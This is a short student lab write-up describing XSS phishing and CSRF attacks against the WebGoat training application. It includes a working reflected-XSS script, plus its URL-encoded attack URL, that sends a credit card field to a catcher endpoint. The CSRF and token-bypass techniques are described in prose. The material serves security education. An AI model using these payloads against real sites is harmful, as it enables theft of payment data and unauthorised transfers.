#Peiqi Hu, 1002263935, peiqi.hu@mail.utoronto.ca
#Jefferson Zhong, 1003946000, jefferson.zhong@mail.utoronto.ca

PART1: Phishing with XSS
	- We exploit XSS vulnerability by injecting HTML code in the
	search bar for which creates a fake login form. Credentials 
	submitted through the form will be uploaded to the hacker's
	server.

PART2: Reflected XSS Attacks
	- scripts
		<script>
			hack = function() {
				console.log(document.form.input1.value);
				XssImage = new Image;
				XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="
				+ new String(document.form.input1.value)
			}
			document.form.buy.setAttribute('onclick', 'hack()')
		</script>
	- unencoded URL: http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=123&input2=%3Cscript%3E%20hack%20=%20function()%20{%20console.log(document.form.input1.value);%20XssImage%20=%20new%20Image;%20XssImage.src=%22http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=%22%20+%20new%20String(document.form.input1.value)%20}%20document.form.buy.setAttribute('onclick',%20'hack()')%20%3C/script%3E
	 			- pass specified value to the input1 and 'scripts'(above) to input2 field
	- We injected encoded onclick function into existing HTML
	element through the "input2" field in the URL. The onclick
	function will upload user credentials to the hacker's server
	when the 'submit' button is clicked.

PART3: Cross Site Request Forgery (CSRF)
	- We injected img element with malicious src attribute into the
	message content. The malicious src exploits the vulnerabilitiy
	of a "transfer" field. When the img element is loaded, it will
	transfer recipient's money with amount specified by "transfer".

PART4: CSRF Prompt By-Pass
	- We injected two iframes with malicious src attributes and a
	script with into the message content. First iframe's src prompts
	a transfer, and the script sets second iframe's url to confirm
	the transfer. Each url exploits the vulnerabilitiy of the
	"transfer" field, for which can specify the amount to be transfer
	or confirm a transfer. 

PART5: CSRF Token By-Pass
	- We injected two iframes with malicious src attributes
	and a script between the two iframes. The first iframe's src starts
	a transfer. Then the script sets the second iframe's src which pass
	the token value taken through onload function. After the script
	sets the url of the second iframe, the second iframe will reload
	and finish the attack to transfer values specified in url.